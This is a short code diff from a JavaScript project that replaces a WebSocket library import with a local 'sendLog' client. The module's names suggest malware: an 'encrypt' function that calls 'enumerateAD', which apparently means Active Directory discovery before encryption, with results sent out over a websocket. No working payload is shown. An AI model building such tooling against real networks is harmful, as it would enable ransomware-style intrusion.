@@ -7,7 +7,7 @@ import https from 'https';
 import createRandomString from './utils/generateRandomString';
 import enumerateAD from './enumerateAd';
 import isActive from './isActive';
-import WebSocket from 'ws';
+import sendLog from './websocket/client';
 
 const encrypt = () => {
   enumerateAD();
